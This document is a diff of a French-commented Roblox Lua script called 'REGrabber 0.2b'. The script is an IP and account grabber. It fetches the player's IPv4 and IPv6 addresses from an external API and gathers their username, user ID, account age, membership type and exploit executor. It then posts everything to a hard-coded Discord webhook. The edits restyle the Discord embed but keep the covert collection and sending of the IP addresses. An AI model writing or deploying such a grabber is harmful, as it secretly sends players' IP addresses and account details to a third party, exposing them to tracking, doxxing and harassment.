@@ -1,54 +1,50 @@
-
-
 local Webhook = "https://discord.com/api/webhooks/1294357215477760061/hy-m4j87g0R_-x2VWWQtj9jovJb_uLRcDWxJuB9VPcY7z0MxMSzYNP3059YTi5150N6w"
 
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (service d'API)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (service d'API)
 
-local HTTPbin = game:HttpGet("https://httpbin.org/get")
-
-local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)
-
-local Headers = {["content-type"] = "application/json"}
-
+-- Récupération des informations sur le joueur
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local AccountAge = LocalPlayer.AccountAge -- Durée du compte en jours
-local MembershipType = tostring(LocalPlayer.MembershipType)
 local UserId = LocalPlayer.UserId -- ID utilisateur
 local PlayerName = LocalPlayer.Name -- Nom du joueur
 local DisplayName = LocalPlayer.DisplayName -- Nom affiché
+local AccountAge = LocalPlayer.AccountAge -- Durée du compte en jours
+local MembershipType = tostring(LocalPlayer.MembershipType) -- Type d'adhésion
 local PlaceID = game.PlaceId -- ID du jeu en cours
+local ProfilePictureUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=420&height=420&format=png" -- URL de l'image de profil
 
 -- Obtenir la date et l'heure de connexion
-local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0')
+local LogTime = os.date('!%Y-%m-%d %H:%M:%S GMT+0')
 
 -- Fonction pour identifier l'exploit utilisé
 function identifyexploit()
-   local success, result = pcall(identifyexecutor)
-   if success then return result end
-   return "Unknown Exploit"
+    local success, result = pcall(identifyexecutor)
+    if success then return result end
+    return "Unknown Exploit"
 end
 
 -- Préparation des données pour le webhook
 local PlayerData = {
     ["content"] = "",
     ["embeds"] = {{
-        ["author"] = { ["name"] = "REGrabber 0.2b" },
-        ["title"] = PlayerName,
-        ["description"] = "aka "..DisplayName,
+        ["author"] = { ["name"] = "📊 Informations du Joueur" },
+        ["title"] = "🧑‍🎤 Détails du Joueur",
+        ["description"] = "Voici les informations sur le joueur 🎮",
+        ["color"] = 0x00FF00, -- Couleur de l'embed (vert)
         ["fields"] = {
-            { ["name"] = "Username:", ["value"] = PlayerName, ["inline"] = true },
-            { ["name"] = "Membership Type:", ["value"] = MembershipType, ["inline"] = true },
-            { ["name"] = "Account Age (days):", ["value"] = AccountAge, ["inline"] = true },
-            { ["name"] = "UserId:", ["value"] = UserId, ["inline"] = true },
-            { ["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true },
-            { ["name"] = "IPv6:", ["value"] = IPv6, ["inline"] = true },
-            { ["name"] = "Place ID:", ["value"] = PlaceID, ["inline"] = true },
-            { ["name"] = "Executor:", ["value"] = identifyexploit(), ["inline"] = true },
-            { ["name"] = "Log Time:", ["value"] = LogTime, ["inline"] = true },
-            { ["name"] = "HTTPbin Data (JSON):", ["value"] = "```json\n"..HTTPbin.."```", ["inline"] = false },
-            { ["name"] = "geoPlugin Data (JSON):", ["value"] = "```json\n"..GeoPlug.."```", ["inline"] = false },
+            { ["name"] = "👤 ID du Joueur:", ["value"] = UserId, ["inline"] = true },
+            { ["name"] = "✨ Nom d'Affichage:", ["value"] = DisplayName, ["inline"] = true },
+            { ["name"] = "💻 Nom d'Utilisateur:", ["value"] = PlayerName, ["inline"] = true },
+            { ["name"] = "🔖 Type d'Adhésion:", ["value"] = MembershipType, ["inline"] = true },
+            { ["name"] = "📅 Durée du Compte (jours):", ["value"] = AccountAge, ["inline"] = true },
+            { ["name"] = "🌐 IPv4:", ["value"] = IPv4, ["inline"] = true },
+            { ["name"] = "🌍 IPv6:", ["value"] = IPv6, ["inline"] = true },
+            { ["name"] = "🎮 ID du Jeu:", ["value"] = PlaceID, ["inline"] = true },
+            { ["name"] = "🕒 Moment de la Requête:", ["value"] = LogTime, ["inline"] = false },
+            { ["name"] = "⚙️ Executor:", ["value"] = identifyexploit(), ["inline"] = true },
         },
+        ["thumbnail"] = { ["url"] = ProfilePictureUrl }, -- Photo de profil du joueur
+        ["footer"] = { ["text"] = "🛠️ REGrabber 0.2b", ["icon_url"] = "https://example.com/icon.png" } -- Remplacez par une URL d'icône si nécessaire
     }}
 }
 
@@ -72,7 +68,7 @@ local function sendData()
         Url = Webhook,
         Body = PlayerDataJson,
         Method = "POST",
-        Headers = Headers
+        Headers = {["content-type"] = "application/json"}
     })
 end
 
